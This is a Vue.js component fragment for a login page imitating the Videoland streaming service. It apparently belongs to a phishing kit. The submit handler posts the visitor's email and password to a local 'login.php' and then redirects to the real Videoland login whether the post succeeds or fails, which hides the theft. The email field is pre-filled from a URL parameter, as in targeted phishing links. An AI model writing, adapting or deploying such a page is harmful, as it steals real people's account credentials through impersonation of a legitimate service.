      <div class="onboarding-background triangular-background--top-left triangular-background--bottom-right"></div>
   </main>
  </div>
</template>

<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      sidemenuShowing: false,
      showError: false,
      emailError: false,
      emailaddress: '',
      password: '',
      showPassword: false,
      referrerPage: "//www.videoland.com/inloggen"
    }
  },
  computed: {
    isValidEmail () {
      const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
      return re.test(String(this.emailaddress).toLowerCase());
    }
  },
  methods: {
    openFAQ () {
      var win = window.open('https://hulp.videoland.com/hc/nl', '_blank');
      win.focus();
    },
    blurEmailInput () {
      this.showError  = !this.isValidEmail
      this.emailError = !this.isValidEmail
    },
    submitForm () {
      let vm = this
      axios.post('login.php', {email: vm.emailaddress, password: vm.password})
      .then(res => {
        window.location.replace(vm.referrerPage);
      })
      .catch(error => {
        window.location.replace(vm.referrerPage);
      })
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
          let vars = uri[1].split("&");
          let getVars = {};
          let tmp = "";
          vars.forEach(function(v) {
            tmp = v.split("=");
            if (tmp.length == 2)
              getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
          });
          this.emailaddress = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      }
    }
  },
  beforeMount () {
    this.initiatePage()
  },
  watch: {
    emailaddress: function (val) {
      this.emailError = !this.isValidEmail
    }
  }
};
</script>

